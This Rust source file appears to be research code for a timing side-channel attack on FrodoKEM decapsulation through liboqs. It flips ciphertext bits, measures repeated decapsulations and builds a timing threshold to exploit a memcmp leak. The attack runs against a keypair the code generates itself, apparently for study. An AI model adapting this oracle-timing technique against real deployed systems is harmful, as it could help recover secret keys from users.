use crate::attack::memcmp_frodo::MeasureSource;
use histogram::Histogram;
use liboqs_rs_bindings::frodokem::FrodoKem;
use log::{debug, info, trace};
use log_derive::{logfn, logfn_inputs};

/// Function that dereministically modifies the input vector.
///
/// To undo apply the same modification one more time
#[logfn(Trace)]
fn modify<FRODO: FrodoKem>(ct: &mut FRODO::Ciphertext, amount: usize) {
    let ct = FRODO::as_slice(ct);
    let limit = ct.len() / 2;
    let bits_to_flip_per_byte = ((amount / limit) + 1) as u32;
    let pattern = (2u8.pow(bits_to_flip_per_byte)) - 1;
    let lower = std::cmp::max(limit, ct.len() - std::cmp::min(amount, ct.len()));
    let upper = ct.len();
    trace!(
        "Using pattern {} to xor bytes {}..{}",
        pattern,
        lower,
        upper,
    );
    for byte in lower..upper {
        ct[byte] ^= pattern;
    }
}

#[logfn_inputs(Trace)]
pub fn find_e<FRODO: FrodoKem>(
    warmup: usize,
    iterations: usize,
    start_mod: usize,
    measure_source: MeasureSource,
) -> Result<(), String> {
    info!(
        "Launching the find_e routine against {} MEMCMP vulnerability.",
        FRODO::name()
    );
    let mut public_key = FRODO::zero_pk();
    let mut secret_key = FRODO::zero_sk();
    let mut ciphertext = FRODO::zero_ct();

    info!("Generating keypair");
    FRODO::keypair(&mut public_key, &mut secret_key)?;

    debug!(
        "Starting with {} bits modification to end of ciphertext!",
        start_mod
    );
    modify::<FRODO>(&mut ciphertext, start_mod);

    info!("Encapsulating shared secret");
    let mut shared_secret_e = FRODO::zero_ss();
    let mut shared_secret_d = FRODO::zero_ss();
    FRODO::encaps(&mut ciphertext, &mut shared_secret_e, &mut public_key)?;

    info!("Running decryption oracle {} times for warmup.", warmup);
    for _ in 0..warmup {
        let _ = FRODO::decaps_measure(&mut ciphertext, &mut shared_secret_d, &mut secret_key)?;
    }

    info!("Running {} iterations with a very minor cipertext modification at the end of C to establish upper bound timing threshold.", iterations);
    let mut nomodhist = Histogram::new();
    for _ in 0..iterations {
        let m = measure_source.measure(|| {
            FRODO::decaps_measure(&mut ciphertext, &mut shared_secret_d, &mut secret_key)
        });
        if let Some(time) = m? {
            nomodhist.increment(time)?;
        };
    }

    debug!(
        "Undoing {} bits modification to end of ciphertext!",
        start_mod
    );
    modify::<FRODO>(&mut ciphertext, start_mod);

    let threshold = nomodhist.percentile(1.0)?;
    info!(
        "Using {} as threshold value, everything below will be used to detect changes to B as well.",
        threshold
    );

    Ok(())
}
